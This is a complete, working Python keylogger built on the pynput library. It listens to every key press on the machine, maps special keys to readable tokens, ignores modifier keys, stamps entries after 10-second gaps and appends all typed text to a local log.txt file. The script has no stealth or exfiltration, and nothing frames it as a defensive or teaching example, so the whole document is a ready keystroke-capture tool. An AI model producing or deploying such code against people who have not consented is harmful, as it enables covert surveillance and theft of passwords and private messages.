from pynput.keyboard import Listener
from datetime import datetime, timedelta

last_logged_time = datetime.now()

def write_key_file(key):
    global last_logged_time
    current_time = datetime.now()

    letter=str(key)
    letter=letter.replace("'","")

    # Handle special keys
    key_mappings = {
        "Key.space": " ",
        "Key.backspace": "<BackSpace>",
        "Key.caps_lock": "<CapsLock>",
        "Key.tab": "\t",
        "Key.esc": "<Escape>",
        "Key.delete": "<Delete>",
        "Key.insert": "<Insert>",
        "Key.up": "<ArrowUp>",
        "Key.down": "<ArrowDown>",
        "Key.left": "<ArrowLeft>",
        "Key.right": "<ArrowRight>",
        "Key.enter": "\n"
    }

    if letter in key_mappings:
        letter = key_mappings[letter]

    # Ignore certain keys
    ignored_keys = {"Key.shift", "Key.shift_r", "Key.ctrl_l", "Key.ctrl_r", "Key.alt_l", "Key.alt_r"}
    if letter in ignored_keys:
        return

    # Check time and log only if 10 seconds have passed
    if (current_time - last_logged_time).seconds >= 10:
        timestamp = current_time.strftime("%d/%m/%Y %H:%M:%S")
        with open("log.txt", "a") as logKey:
            logKey.write(f"\n[{timestamp}] ")
        last_logged_time = current_time

    with open("log.txt", "a") as logKey:
        logKey.write(letter)

with Listener(on_press=write_key_file) as listener:
    listener.join()
